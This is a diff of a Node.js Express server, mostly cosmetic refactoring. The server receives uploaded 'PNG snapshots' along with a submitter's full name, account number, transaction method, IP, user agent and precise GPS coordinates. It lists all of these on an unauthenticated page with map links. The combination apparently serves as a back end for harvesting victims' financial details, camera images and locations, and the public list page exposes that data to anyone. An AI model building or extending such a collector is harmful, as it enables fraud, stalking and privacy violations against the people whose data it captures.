@@ -7,13 +7,13 @@ const multer = require("multer");
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// Make sure uploads directory exists
+// ---------- Ensure uploads dir ----------
 const uploadDir = path.join(__dirname, "uploads");
 if (!fs.existsSync(uploadDir)) {
   fs.mkdirSync(uploadDir);
 }
 
-// Multer storage for PNG photos
+// ---------- Multer storage for PNG snapshots ----------
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
     cb(null, uploadDir);
@@ -25,38 +25,26 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage });
 
-// Middlewares
+// ---------- Middleware ----------
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+app.use(express.static(path.join(__dirname, "public")));        // /public
+app.use("/files", express.static(uploadDir));                   // /files/xyz.png
 
-// Static files (HTML, JS, CSS) from /public
-app.use(express.static(path.join(__dirname, "public")));
-
-// Serve uploaded files at /files/<filename>
-app.use("/files", express.static(uploadDir));
-
-// In-memory log of submissions (resets when container restarts)
+// In-memory DB (resets when instance restarts)
 const submissions = [];
 
-/**
- * Helper: get client IP (Render / proxy aware)
- */
+// Get client IP (respect x-forwarded-for from Render)
 function getClientIp(req) {
   const xff = req.headers["x-forwarded-for"];
-  if (xff) {
-    return xff.split(",")[0].trim();
-  }
+  if (xff) return xff.split(",")[0].trim();
   return req.socket.remoteAddress || "unknown";
 }
 
-/**
- * POST /upload-photo
- * Receives: form fields + photo + optional lat/long/accuracy
- */
+// ---------- Upload endpoint ----------
 app.post("/upload-photo", upload.single("photo"), (req, res) => {
   try {
-    const file = req.file;
-    if (!file) {
+    if (!req.file) {
       return res.status(400).send("No photo uploaded");
     }
 
@@ -79,27 +67,33 @@ app.post("/upload-photo", upload.single("photo"), (req, res) => {
       fullName: fullName || "",
       accountNumber: accountNumber || "",
       method: transactionMethod || "",
-      fileName: file.filename,
-      latitude: latitude || null,
-      longitude: longitude || null,
-      accuracy: accuracy || null
+      fileName: req.file.filename,
+      latitude: latitude ? Number(latitude) : null,
+      longitude: longitude ? Number(longitude) : null,
+      accuracy: accuracy ? Number(accuracy) : null
     };
 
     submissions.push(record);
+    console.log("Saved submission:", record);
 
-    res
-      .status(200)
-      .send(`Photo stored as: ${file.filename}`);
+    res.status(200).send(`Photo stored as: ${req.file.filename}`);
   } catch (err) {
     console.error("Upload error:", err);
     res.status(500).send("Server error");
   }
 });
 
-/**
- * GET /files-list
- * Simple HTML table of all submissions with a Google Maps link if location present
- */
+// ---------- Helpers ----------
+function escapeHtml(str) {
+  return String(str || "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+// ---------- Files list ----------
 app.get("/files-list", (req, res) => {
   let html = `
   <!doctype html>
@@ -116,6 +110,7 @@ app.get("/files-list", (req, res) => {
       tr:nth-child(even) { background: #f9fafb; }
       a { color: #1d4ed8; text-decoration: none; }
       a:hover { text-decoration: underline; }
+      small { color: #6b7280; }
     </style>
   </head>
   <body>
@@ -137,13 +132,15 @@ app.get("/files-list", (req, res) => {
   `;
 
   for (const s of submissions) {
-    const mapLink =
-      s.latitude && s.longitude
-        ? `<a href="https://www.google.com/maps?q=${encodeURIComponent(
-            s.latitude + "," + s.longitude
-          )}" target="_blank">View on map</a><br/><small>±${s.accuracy ||
-            "?"}m</small>`
-        : "";
+    let locationCell = "<small>Not provided</small>";
+    if (s.latitude != null && s.longitude != null) {
+      const coords = `${s.latitude},${s.longitude}`;
+      locationCell = `
+        <a href="https://www.google.com/maps?q=${encodeURIComponent(coords)}"
+           target="_blank">${coords}</a><br/>
+        <small>±${s.accuracy || "?"} m</small>
+      `;
+    }
 
     html += `
       <tr>
@@ -153,10 +150,9 @@ app.get("/files-list", (req, res) => {
         <td>${escapeHtml(s.accountNumber)}</td>
         <td>${escapeHtml(s.method)}</td>
         <td>${escapeHtml(s.userAgent)}</td>
-        <td>${mapLink}</td>
-        <td><a href="/files/${encodeURIComponent(
-          s.fileName
-        )}" target="_blank">${s.fileName}</a></td>
+        <td>${locationCell}</td>
+        <td><a href="/files/${encodeURIComponent(s.fileName)}"
+               target="_blank">${s.fileName}</a></td>
       </tr>
     `;
   }
@@ -167,21 +163,9 @@ app.get("/files-list", (req, res) => {
   </body>
   </html>
   `;
-
   res.send(html);
 });
 
-// Simple HTML escape
-function escapeHtml(str) {
-  return String(str || "")
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#39;");
-}
-
-// Start server
 app.listen(PORT, () => {
   console.log(`Listening on ${PORT}`);
 });
